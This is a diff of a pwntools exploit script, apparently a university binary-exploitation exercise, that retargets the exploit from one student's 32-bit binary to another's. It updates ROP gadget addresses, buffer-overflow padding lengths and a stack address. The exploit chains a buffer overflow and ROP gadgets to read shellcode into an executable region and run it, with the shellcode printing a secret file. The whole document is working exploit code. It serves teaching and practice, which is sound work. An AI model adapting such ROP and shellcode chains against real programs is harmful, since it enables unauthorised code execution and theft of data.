@@ -4,29 +4,30 @@ from pwn import *
 IP = "0.0.0.0"
 PORT = 0
 
-context.arch = "i386"
-
 file_secret = "secret.txt"
-file_binary = "10101_YAKOBCHUK_Dmytro_32"
-# file_binary = "10126_ZELENIN_Vladyslav_32"
+# file_binary = "10101_YAKOBCHUK_Dmytro_32"
+file_binary = "10126_ZELENIN_Vladyslav_32"
 file_breakpoints = "breaks32.gdb"
 
 # GADGETS
-pop_eax = p32(0x80b0cda)  # pop eax; ret
-pop_ebx = p32(0x804e4be)  # pop ebx; ret
-mov_ecx_eax___mov_eax_ecx = p32(0x8093df8)  # mov ecx, eax; mov eax, ecx; ret
-pop_edx___pop_ebx = p32(0x8058959)  # pop edx; pop ebx; ret
-syscall = p32(0x8071c50)  # int 0x80; ret
-ret = p32(0x8049d20)  # ret
+pop_eax = p32(0x80b0e7a)  # pop eax; ret
+pop_ebx = p32(0x8065a6b)  # pop ebx; ret
+mov_ecx_eax___mov_eax_ecx = p32(0x8093ec8)  # mov ecx, eax; mov eax, ecx; ret
+pop_edx___pop_ebx = p32(0x80585e9)  # pop edx; pop ebx; ret
+syscall = p32(0x8071940)  # int 0x80; ret
+ret = p32(0x80b0e7b)  # ret
 
 
 def run_local(debug = True, wsl2 = True):
     binary = ELF(f"./{file_binary}")
-    p = process(["setarch", "-R", f"./{file_binary}"], env = {})  # Clean run
-    # p = process([f"./{file_binary}"])  # For cyclic()
+    context.arch = "i386"
+    context.aslr = False  # True for cyclic(), False for clean run
+
+    p = process([f"./{file_binary}"], env = {})
     pid = util.proc.pidof(p)[0]
     if debug == False:
         return p
+
     if wsl2 == False:  # Debug in Linux
         log.info(f"Waiting for GDB...\n"
                  f"$ gdb -q -p {pid}")
@@ -122,7 +123,7 @@ def main():
     sc = asm(shellcraft.cat(file_secret) + shellcraft.echo("\n") + shellcraft.exit(22))
 
     # Buffer overflow (with ret chain)
-    buf = b"A" * 898  # eax before "cmp eax, 0x539"
+    buf = b"A" * 329  # eax before "cmp eax, 0x539"
     buf += p32(1337)
     buf += ret * 200
 
@@ -137,8 +138,8 @@ def main():
     buf += sys_read(stdin_fd, rwx_addr, len(sc))
 
     buf += p32(rwx_addr)  # Jump to shellcode
-    buf = buf.ljust(4498, b"B")  # ecx after "pop ecx"
-    buf += p32(0xffffd000)
+    buf = buf.ljust(1653, b"B")  # ecx after "pop ecx"
+    buf += p32(0xffffda00)
     # buf += p32(0xdddddddd)
     find_bad_bytes(buf)
 
